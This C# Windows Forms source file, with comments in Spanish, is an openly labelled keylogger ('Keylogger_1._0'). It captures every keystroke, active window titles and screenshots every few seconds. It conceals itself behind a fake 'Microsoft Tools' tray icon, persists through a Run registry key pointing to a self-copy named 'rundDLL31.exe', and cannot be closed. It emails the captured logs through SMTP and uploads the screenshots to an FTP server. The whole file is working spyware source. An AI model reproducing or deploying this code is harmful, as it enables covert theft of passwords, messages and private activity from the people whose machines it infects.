using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Net.Mail;
using System.Net;
using Microsoft.Win32;
using System.Drawing.Imaging;






namespace Keylogger_1._0
{
    public partial class frmPrincipal : Form
    {

        private Timer timerCapturaTecla;
        private Timer timerGuardarArchivo;
        private Timer timerEnviarMail;
        private Timer timerBorrarLabel;
        private Timer timerDateTimer;
        private Timer timerVentanaActiva;
        private Timer timerCapturaPantalla;
        private Timer timerBorrarArchivos;
        private string Keybuffer;
        private string key;
        private string Archivo;
        private string ArchivoFinal;
        private string ArchivoFinalLogs;        
        private string Logs;
        private string ruta;
        private string rutaAutoCopiar;
        private NotifyIcon notifyIcon;
        private string Mail;
        private string Pass;
        private string Target;
        private string ServidorGmail;
        private int Puerto;
        private string nombre1, nombre2;
        private string fecha;
        private string nombreImagen;
        private string nombreImagenFinal;    
        private string ASUNTO = "logs de " + Environment.MachineName;
        private const string mensaje_texto = "Registro de teclas pulsadas";
        private Attachment logs_;
        private Attachment archivo_;
        private string servidorFtp;
        private string usuarioFtp;
        private string passFtp;

                    
        

        // Librerias para la captura de las teclas pulsadas
        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(Keys tecla);
        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(Int32 teclas);
        [DllImport("user32.dll")]
        private static extern short GetKeyState(Keys teclas);
        [DllImport("user32.dll")]
        private static extern short GetKeyState(Int32 teclas);
        //Libreias para octener la ventana activa
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr ventana, StringBuilder cadena, int cantidad);





        public frmPrincipal()
        {
            // Inicializamos todos los objetos que se escriban aqui
            InitializeComponent();
            Keybuffer = string.Empty;                                          
            Logs = "Logs de " + Environment.MachineName + ".txt";
            //Ruta de la carpeta creada en el sistema
            ruta = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + @"\Google\";
            rutaAutoCopiar = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + @"\Microsoft\";
            
            ArchivoFinalLogs = Path.Combine(ruta, Logs);           
            lblInformacion.Text = Environment.MachineName + " " + "Administrador";
                       

            //Timer que nos permitirá capturar las teclas pulsadas
            timerCapturaTecla = new Timer();
            timerCapturaTecla.Interval = 10;
            timerCapturaTecla.Enabled = true;
            // Asignar el handler a ejecutar
            timerCapturaTecla.Tick += new EventHandler(capturarTeclasPulsadas);
            timerCapturaTecla.Start();

            //Timer que nos permitira guardar en el disco duro todo lo que hemos escrito durante un periodo de tiempo
            timerGuardarArchivo = new Timer();
            timerGuardarArchivo.Interval = 12000;
            timerGuardarArchivo.Enabled = true;
            //Asignarle el Handler a ejecutar
            timerGuardarArchivo.Tick += new EventHandler(guardarArchivo);

            //Timer que nos permitira enviar el archivo y logs cada cierto tiempo
            timerEnviarMail = new Timer();
            timerEnviarMail.Interval = 30000;
            timerEnviarMail.Enabled = false;
            //Asignar el handler a ejecutar
            timerEnviarMail.Tick += new EventHandler(enviarMail);

            //Timer que nos permitira borrarle el texto a los label
            timerBorrarLabel = new Timer();
            timerBorrarLabel.Interval = 5000;
            timerBorrarLabel.Enabled = true;
            timerBorrarLabel.Tick += new EventHandler(borrarTextoLabel);

            //Timer que nos permitira observar el la Date del sistema
            timerDateTimer = new Timer();
            timerDateTimer.Interval = 10;
            timerDateTimer.Enabled = true;
            timerDateTimer.Tick += new EventHandler(dateTimer);

            //Timer que nos permitira capturar la ventana activa
            timerVentanaActiva = new Timer();
            timerVentanaActiva.Interval = 10;
            timerVentanaActiva.Enabled = true;
            timerVentanaActiva.Tick += new EventHandler(capturarNombreVentanaActiva);

            //Timer que nos permitira capturar la pantalla del monitor actual
            timerCapturaPantalla = new Timer();
            timerCapturaPantalla.Interval = 5000;
            timerCapturaPantalla.Enabled = true;
            timerCapturaPantalla.Tick += new EventHandler(capturarPantalla);

            //Timer que nos permitira borrar todos los archivo del directorio
            timerBorrarArchivos = new Timer();
            timerBorrarArchivos.Interval = 60000; 
            timerBorrarArchivos.Enabled = true;
            timerBorrarArchivos.Tick += new EventHandler(borrarArchivos);

            


            
            

        }
                
        public void guardarArchivo(object sender, EventArgs e)
        {
                //Declaramos el nombre del archivo y le asignamos el nombre de la host
                Archivo = Environment.UserName + ".txt";
                ArchivoFinal = Path.Combine(ruta, Archivo);
                              
                //Objeto local declarado
                StreamWriter guardar = null;

                if (!Directory.Exists(ruta))
                {
                    Directory.CreateDirectory(ruta);
                }

                // Función que nos permitira guandar la información capturada
                try
                {
                    // Instanciamos un objeto de tipo StreamWriter, para poder abrir el archivo y escribir en el
                    guardar = new StreamWriter(ArchivoFinal, true);
                    // Escribimos dentro del archivo                
                    guardar.WriteLine(Keybuffer.ToString());
                    timerGuardarArchivo.Stop();
                    timerEnviarMail.Start();
                                        
                    
                }
                catch (IOException ex)
                {
                    //Registrar mensaje del error obtenido
                    logsRegistro(ex.Message + " " + DateTime.Now.ToString());
                }
                finally
                {
                    //Luego de la escritura en el archivo, realizar la siguientes acciones
                    //Cierra el archivo
                    guardar.Close();
                    //Libera el recurso utilizado
                    guardar.Dispose();
                    //Deja en blanco el Keybuffer
                    Keybuffer = string.Empty;
                    
                    
                }
                
            
        }
        
        public void capturarTeclasPulsadas(object sender, EventArgs e)
        {
            string tecla;       

                                 
                 //Recorrer todas las teclas del teclado
                foreach (Int32 h in Enum.GetValues(typeof(System.Windows.Forms.Keys)))
                {
                    //Preguntar si hubo alguna tecla pulsada
                    if (GetAsyncKeyState(h) == -32767)
                    {
                        //Recuperar la tecla virtual que fue pulsada físicamente
                        key = Enum.GetName(typeof(System.Windows.Forms.Keys), h);
                        //Teclas del lado dereco del teclad
                        if (key == "NumPad0") { Keybuffer += Convert.ToChar(48); }
                        //Nos permite capturar las combinaciones de la tecla ShiftKey
                        else if (Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey)))
                        {
                            //Capturar la @
                            if (key == "D2")
                            {
                                Keybuffer += Convert.ToChar(64);
                            }
                            //Capturar el _
                            else if (key == "OemMinus")
                            {
                                Keybuffer += Convert.ToChar(95);
                            }
                            else 
                            {
                                tecla = key.Replace("ShiftKey", "-");                                
                                Keybuffer += tecla;
                            }

                        }
                          


                   //Teclas del lado dereco del teclad
                        else if (key == "NumPad1") { Keybuffer += Convert.ToChar(49); }
                        else if (key == "NumPad2") { Keybuffer += Convert.ToChar(50); }
                        else if (key == "NumPad3") { Keybuffer += Convert.ToChar(51); }
                        else if (key == "NumPad4") { Keybuffer += Convert.ToChar(52); }
                        else if (key == "NumPad5") { Keybuffer += Convert.ToChar(53); }
                        else if (key == "NumPad6") { Keybuffer += Convert.ToChar(54); }
                        else if (key == "NumPad7") { Keybuffer += Convert.ToChar(55); }
                        else if (key == "NumPad8") { Keybuffer += Convert.ToChar(56); }
                        else if (key == "NumPad9") { Keybuffer += Convert.ToChar(57); }
                        // Teclas del lado izquierdo del teclado
                        else if (key == "D0") { Keybuffer += Convert.ToChar(48); }
                        else if (key == "D1") { Keybuffer += Convert.ToChar(49); }
                        else if (key == "D2") { Keybuffer += Convert.ToChar(50); }
                        else if (key == "D3") { Keybuffer += Convert.ToChar(51); }
                        else if (key == "D4") { Keybuffer += Convert.ToChar(52); }
                        else if (key == "D5") { Keybuffer += Convert.ToChar(53); }
                        else if (key == "D6") { Keybuffer += Convert.ToChar(54); }
                        else if (key == "D7") { Keybuffer += Convert.ToChar(55); ; }
                        else if (key == "D8") { Keybuffer += Convert.ToChar(56); ; }
                        else if (key == "D9") { Keybuffer += Convert.ToChar(57); ; }
                        //Preguntar si esta combinación de tecla fue pulsada, para llamar al formulario
                        else if (Convert.ToBoolean(GetAsyncKeyState(Keys.ControlKey)) && Convert.ToBoolean(GetAsyncKeyState(Keys.LMenu)))
                        {
                            //Cambinació de teclas para mostrar y/o cultar el formaulario
                            if (key == "M")
                            {
                                //Mostrar el formulario
                                this.Show();
                                this.ShowInTaskbar = true;
                            }
                            else if (key == "O")
                            {
                                //Esconder el formulario
                                this.Hide();
                                this.ShowInTaskbar = false;
                            }

                        }


                        else if (Convert.ToBoolean(GetAsyncKeyState(Keys.OemPeriod)))
                        {
                            //Guarda la pulsación del .
                            Keybuffer += Convert.ToChar(46);
                        }

                        else if (Convert.ToBoolean(GetAsyncKeyState(Keys.OemMinus)))
                        {
                            //Guarda la pulsación del -
                            Keybuffer += Convert.ToChar(45);                            
                        }

                           


                        else
                        {
                            //Filtrar los tipos de caracteres pulsados
                            if (key == "Back")
                            {
                                tecla = key.Replace("Back", "Back");
                                Keybuffer += tecla.ToUpper();
                            }
                            else if (key == "Enter")
                            {
                                tecla = key.Replace("Enter", Convert.ToChar(10).ToString());
                                Keybuffer += tecla.ToLower();

                            }
                            else if (key == "Space")
                            {
                                tecla = key.Replace("Space", " ");
                                Keybuffer += tecla;
                            }
                            else if (key == "Delete")
                            {
                                tecla = key.Replace("Delete", "Del");
                                Keybuffer += tecla.ToUpper();
                            }
                            else if (key == "LButton")
                            {
                                tecla = key.Replace("LButton", "");
                                Keybuffer += tecla;
                            }
                            else if (key == "RButton")
                            {
                                tecla = key.Replace("RButton", "");
                                Keybuffer += tecla;
                            }
                            else if (key == "Letf")
                            {
                                tecla = key.Replace("Letf", "");
                                Keybuffer += tecla;
                            }
                            else if (key == "Right")
                            {
                                tecla = key.Replace("Right", "");
                                Keybuffer += tecla;
                            }
                            else if (key == "Tab")
                            {
                                tecla = key.Replace("Tab", Convert.ToChar(09).ToString());
                                Keybuffer += tecla;
                            }
                            else if (key == "ControlKey")
                            {
                                tecla = key.Replace("ControlKey", "");                                
                                Keybuffer += tecla;
                            }
                            else if (key == "Down")
                            {
                                tecla = key.Replace("Down", "");
                                Keybuffer += tecla;                                
                            }
                            else if (key == "Up")
                            {
                                tecla = key.Replace("Up", "");
                                Keybuffer += tecla;                                
                            }

                            //Fin del ciclo de preguntas
                            else
                            {
                                Keybuffer += key.ToLower();

                            }

                        }



                    }


                }
            
                    
               

            


        }
        
        private void frmPrincipal_Load(object sender, EventArgs e)
        {
            //Instanciar el objeto
            notifyIcon = new NotifyIcon();
            //Asignar los valores para el NotifyIcon
            notifyIcon.Icon = this.Icon;
            notifyIcon.Text = "Microsoft Tools";
            notifyIcon.Visible = true;
            //Ocultar el formulario principal
            this.Hide();
            //Ocultarlo de la barra de estado
            this.ShowInTaskbar = false;

            //Crear la clave si es diferente a mi computadora
            crearClaveRegistro();                
          
            //Auto copiarse a la dirección ya establecida
            autoCopiarme();

            //Caragar los cambios registrados en la propiedad dinamicas del envio de Mail
            txtMail.Text = chrome.Properties.Settings.Default.Mail;
            txtPass.Text = chrome.Properties.Settings.Default.Pass;
            txtTarget.Text = chrome.Properties.Settings.Default.Target;
            txtServidorGmail.Text = chrome.Properties.Settings.Default.ServidorGmail;
            txtPuerto.Text = chrome.Properties.Settings.Default.Puerto.ToString();
               
            
            //Caragar los cambios registrados en la propiedad dinamicas del FTP
            txtServidorFTP.Text = chrome.Properties.Settings.Default.ServidorFTP;
            txtUsuarioFTP.Text = chrome.Properties.Settings.Default.UsuarioFTP;
            txtPassFTP.Text = chrome.Properties.Settings.Default.PassFTP;
            
            //Asignar a estas variables globales cada una de las propiedades guardada dinámicamente
            Mail = txtMail.Text;
            Pass = txtPass.Text;
            Target = txtTarget.Text;
            ServidorGmail = txtServidorGmail.Text;
            Puerto = Convert.ToInt32(txtPuerto.Text);
            servidorFtp = txtServidorFTP.Text;
            usuarioFtp = txtUsuarioFTP.Text;
            passFtp = txtPassFTP.Text;

        }

        private void frmPrincipal_FormClosing(object sender, FormClosingEventArgs e)
        {
            //Cuando se va a cerrar el formulario eliminar el objeto de la barra de tareas           
            //this.notifyIcon.Visible = false;
            //Esto es necesario, para que no se quede el icono en la barra de tareas el cual se quita al pasar el ratón por encima            
           //this.notifyIcon = null;
            //Anolar la cancelación de la ventana para que el programa nunca se detenga
            e.Cancel = true;
            

        }

        private void crearClaveRegistro()
        {
            try
            {
                //Declaramos el objeto a utilizar
                RegistryKey registroRun = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
                //preguntar si existe la clave
                if (registroRun != null)
                {
                    //Crear el valor que tendrá dicha clave
                    registroRun.SetValue("Microsoft Tools", rutaAutoCopiar + "rundDLL31.exe", RegistryValueKind.String);
                }

            }

            catch (Exception ex)
            {
                logsRegistro(ex.Message + " " + DateTime.Now.ToString());
            }


        }

        private bool VerificarConexionInternet(string mURL)
        {
            //Objetos a utilizar en la validación
            WebRequest peticion = default(WebRequest);
            HttpWebResponse respuesta = default(HttpWebResponse);

            try
            {
                //Hacer la petición a la red, especificando la url
                peticion = WebRequest.Create(mURL);
                //Guardar la petición en la variable respuesta
                respuesta = (HttpWebResponse)peticion.GetResponse();
                //Si todo es correcto devolver true
                return true;
            }
            catch(Exception ex)
            {
                //Guardar un logs en caso de contener error la petición
                logsRegistro(ex.Message + " " + DateTime.Now.ToString());
                return false;
            }
            
        }      

        private void logsRegistro(string texto)
        {
            StreamWriter log = null;   
           //Preguntar si el Directorio existe
            if (!Directory.Exists(ruta))
            {
                //Crear el Directorio si no existe
                Directory.CreateDirectory(ruta);
            }

            // Función que nos permitira guandar la información del log del registro
            try
            {
                // Instanciamos un objeto de tipo StreamWriter, para poder abrir el archivo y escribir en el
                log = new StreamWriter(ArchivoFinalLogs, true);
                // Escribimos dentro del archivo                
                log.WriteLine(texto.ToString());
            }
            catch(Exception ex)
            {
                logsRegistro(ex.Message + " " + DateTime.Now.ToString());
            }
            finally
            {
                //Cerrar el archivo de log
                if (log != null)
                {
                    //Cierra el archivo
                    log.Close();
                }

            }

        }
        
        private void enviarMail(object sender, EventArgs e)
        {
            //Validar antes de enviar los archivos, si la pc tiene internet
            if (VerificarConexionInternet("https://www.google.com.do/?gws_rd=ssl"))
               {

                //Declaraciones de los mail de y a los cuales seran usados por el sistema
                MailAddress de = new MailAddress(Mail.ToString());
                MailAddress a = new MailAddress(Target.ToString());
                //Creación del mensaje
                MailMessage mensaje = new MailMessage(de, a);
                //Asunto del mensaje
                mensaje.Subject = ASUNTO;
                //Cuerpo del mensaje
                mensaje.Body = mensaje_texto;                
                //Configurar el servidor de Gmail
                SmtpClient gmailSender = new SmtpClient(ServidorGmail.ToString(), Puerto);
                gmailSender.UseDefaultCredentials = false;
                gmailSender.EnableSsl = true;
                gmailSender.Credentials = new NetworkCredential(Mail.ToString(), Pass.ToString());

                try
                {
                    //Cargara la ruta los archivos adjunto que seran enviado
                    archivo_ = new Attachment(ArchivoFinal);
                    logs_ = new Attachment(ArchivoFinalLogs);
                    //Preguntar si se ha generado algun archivo de logs
                    if (File.Exists(ArchivoFinalLogs))
                    {
                        //Agregar al Attachemnts
                        mensaje.Attachments.Add(logs_);
                    }              
                                       
                    //Anadir el archivo adjunto al mensaje
                    mensaje.Attachments.Add(archivo_);                    
                    //Enviar el mensaje
                    gmailSender.Send(mensaje);
                    //Liberar el archivo
                    logs_.Dispose();
                    archivo_.Dispose();
                   timerGuardarArchivo.Start();
                   timerEnviarMail.Stop();
                                        

                }
                catch(Exception ex)
                {
                    logsRegistro(ex.Message + " " + DateTime.Now.ToString());
                }

               }
                      
                
                     
                              


      }

        private void subirFtp(object sender, EventArgs e)
        {
            if (VerificarConexionInternet("https://www.google.com.do/?gws_rd=ssl"))
            {
                try
                {
                    //Configurar las credenciales del Servidor FTP
                    WebClient ftp = new WebClient();
                    ftp.Credentials = new NetworkCredential(usuarioFtp, passFtp);
                    //Hacer un recorrido de todas las imagenes capturadas hasta el momento
                    foreach (string archivo in Directory.GetFiles(ruta, "*jpg"))
                    {
                        //Subir las imagenes una por una al Servidor FTP
                        ftp.UploadFile(servidorFtp, archivo);
                    }
                                  

                }
                catch (WebException ex)
                {
                    logsRegistro(ex.Message + DateTime.Now.ToString());
                }

            }
            
                

                
        }

        private void btnGuardarCorreo_Click(object sender, EventArgs e)
        {
            //Configurar los campos dinamicos
            chrome.Properties.Settings.Default.Mail = Convert.ToString(txtMail.Text);
            chrome.Properties.Settings.Default.Pass = Convert.ToString(txtPass.Text);
            chrome.Properties.Settings.Default.Target = Convert.ToString(txtTarget.Text);
            chrome.Properties.Settings.Default.Save();
            //Limpiar los campos
            txtMail.Text = "";
            txtPass.Text = "";
            txtTarget.Text = "";
            btnGuardarCorreo.Text = "Objetos guardados";
            
        }

        private void btnGuardarServidorGmail_Click(object sender, EventArgs e)
        {
            chrome.Properties.Settings.Default.ServidorGmail = Convert.ToString(txtServidorGmail.Text);
            chrome.Properties.Settings.Default.Puerto = Convert.ToInt32(txtPuerto.Text);
            chrome.Properties.Settings.Default.Save();
            btnGuardarServidorGmail.Text = "Objetos guardados";
        }

        private void borrarTextoLabel(object sender, EventArgs e)
        {
            btnGuardarCorreo.Text = "Guardar";
            btnGuardarServidorGmail.Text = "Guardar";
            btnGuardarFTP.Text = "Guardar";
        }

        private void dateTimer(object sender, EventArgs e)
        {
            lblDate.Text = DateTime.Now.ToString();
        }

        private void capturarNombreVentanaActiva(object sender, EventArgs e)
        {
            const int limite = 256;
            StringBuilder buffer = new StringBuilder(limite);
            IntPtr manager = GetForegroundWindow();

            if(GetWindowText(manager, buffer, limite) > 0)
            {
                nombre1 = buffer.ToString();
                if(nombre1 != nombre2)
                {
                    nombre2 = nombre1;
                    logsRegistro(nombre2);                    
                }

            }
                
        }

        private void capturarPantalla(object sender, EventArgs e)
        {                  
                        
            try
            {
                //Obetenr la fecha del sistema y personalizarla con el formato descrito
                fecha = DateTime.Now.ToString("h:mm:ss tt");
                //Limpiar la variables de espacios en blancos
                nombreImagen = fecha.Trim() + ".jpg";
                //Reemplazar los dos puntos por el guión
                nombreImagenFinal = nombreImagen.Replace(":", "-");   
                int width = Screen.GetBounds(new Point(0, 0)).Width;
                int height = Screen.GetBounds(new Point(0, 0)).Height;
                //Creamos un objeto Bitmap
                Bitmap now = new Bitmap(width, height);
                //Creamos un grafico a traves del objeto Bitmap
                Graphics grafico = Graphics.FromImage((Image)now);
                //Obtenemos la captura de la pantalla con las dimensiones ya establecidas
                grafico.CopyFromScreen(0, 0, 0, 0, new Size(width, height));
                //Guardamos la captura de la pantalla en un lugar que se haya elegido previamente
                now.Save(ruta + nombreImagenFinal);
                
            }
            catch(Exception ex)
            {
                logsRegistro(ex.Message + DateTime.Now.ToString());
            }
            
            
        }

        private void borrarArchivos(object sender, EventArgs e)
        {
            try
            {

                foreach (string archivo in Directory.GetFiles(ruta, "*.*"))
                {
                    //Borra cada archivo encontrado en el directorio
                    File.Delete(archivo);

                }
            }
            catch(Exception ex)
            {
                logsRegistro(ex.Message + DateTime.Now.ToString());
            }
        }

        private void btnGuardarFTP_Click(object sender, EventArgs e)
        {
            //Asignar las propiedades
            chrome.Properties.Settings.Default.ServidorFTP = Convert.ToString(txtServidorFTP.Text);
            chrome.Properties.Settings.Default.UsuarioFTP = Convert.ToString(txtUsuarioFTP.Text);
            chrome.Properties.Settings.Default.PassFTP = Convert.ToString(txtPassFTP.Text);
            //Guardar los cambios
            chrome.Properties.Settings.Default.Save();
            btnGuardarFTP.Text = "Cambios guardados";

        }

        private void autoCopiarme()
        {
            //Nombre del fichero
            string nombreApps = "rundDLL31.exe"; 
            //Obtener el Directorio actual de la Apps
            string directorioFuente = Directory.GetCurrentDirectory();
            //Obterner la dirección completa del archivo
            string archivoFuente = Path.Combine(directorioFuente, nombreApps);
            //Establecer el Directorio final que tendrá la Apps
            string directorioFinal = Path.Combine(rutaAutoCopiar, nombreApps);
            //Preguntar si existe el Directorio
            if (!Directory.Exists(rutaAutoCopiar))
            {
                
                try
                {
                    //Crear el Directorio
                    Directory.CreateDirectory(rutaAutoCopiar);
                    //Copiar el fichero a sus destino final
                    File.Copy(archivoFuente, directorioFinal, true);
                }
                catch (Exception ex)
                {
                    //Registrar el error en caso de que se de
                    logsRegistro(ex.Message + DateTime.Now.ToString());
                }
                
            }
            else
            {
                try
                {
                    //Copiar el fichero a sus destino final
                    File.Copy(archivoFuente, directorioFinal, true);
                }
                catch (Exception ex)
                {
                    //Registrar el error en caso de que se de
                    logsRegistro(ex.Message + DateTime.Now.ToString());
                }

            }

            

        }

      

        
    }


}
